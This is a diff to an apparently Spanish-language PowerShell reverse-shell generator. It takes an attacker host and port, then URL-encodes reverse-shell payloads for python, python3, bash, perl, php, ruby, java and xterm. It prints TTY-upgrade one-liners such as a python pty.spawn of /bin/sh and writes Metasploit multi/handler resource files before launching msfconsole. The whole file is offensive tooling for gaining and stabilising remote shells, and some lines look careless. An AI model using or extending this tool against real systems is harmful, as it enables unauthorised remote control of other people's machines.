@@ -1,7 +1,8 @@
 ﻿param(
-[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit
+[string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$metasploit
 
 )
+
 
 $metasploit_perl = @"
 use exploit/multi/handler
@@ -266,16 +267,19 @@ if ($web -eq $true) {
 
 Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host " Tu shell reversa es : `n`n" -ForegroundColor Green 
 
-if ($python -eq $true) {$r_python = $r_python -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" ;write-host $r_python }
-if ($bash -eq $true) {$r_bash = $r_bash  -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_bash }
-if ($perl -eq $true) {$_perl = $r_perl   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_perl }
-if ($php -eq $true) {$r_php = $r_php   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_php }
-if ($ruby -eq $true) {$r_ruby =  $r_ruby   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_ruby }
-if ($java -eq $true) {$r_java = $r_java   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_java }
-if ($xterm -eq $true) {$r_xterm = $r_xterm   -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"; write-host $r_xterm }
+
+if ($python3 -eq $true) {$r_python = $r_python -replace "python","python3" -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" ;write-host "$r_python `n" }
+if ($python -eq $true) {$r_python = $r_python -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" ;write-host "$r_python `n" }
+if ($bash -eq $true) {$r_bash = $r_bash  -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"  ;write-host "$r_bash `n" }
+if ($perl -eq $true) {$r_perl = $r_perl -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"  ;write-host "$r_perl `n"}
+if ($php -eq $true) {$r_php = $r_php -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"  ;write-host "$r_php `n"}
+if ($ruby -eq $true) {$r_ruby =  $r_ruby -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"  ;write-host "$r_ruby `n"}
+if ($java -eq $true) {$r_java = $r_java-replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d"  ;write-host "$r_java `n"}
+if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","%20" -replace "$", "%24" -replace "'","%27" -replace ";","%3b" -replace ":","%3a" -replace ",","%2c" -replace "/","%2f" -replace '"',"%22" -replace "\[","%5b" -replace "\]","%5d" -replace "\=","%3d" ;write-host "$r_xterm `n"}
 
 ################################################################################ Spawn tty shell ################################################################################
 
+if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
 if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
 if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
 if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
@@ -284,6 +288,13 @@ if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-
 
 ################################################################################ Metasploit ################################################################################
 
+if ($python -eq $true -and $metasploit -eq $true) {$metasploit_python | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($bash -eq $true -and $metasploit -eq $true) {$metasploit_bash | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($perl -eq $true -and $metasploit -eq $true) {$metasploit_perl | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($ruby -eq $true -and $metasploit -eq $true) {$metasploit_ruby | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($php -eq $true -and $metasploit -eq $true) {$metasploit_php | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
+if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 
 }
 
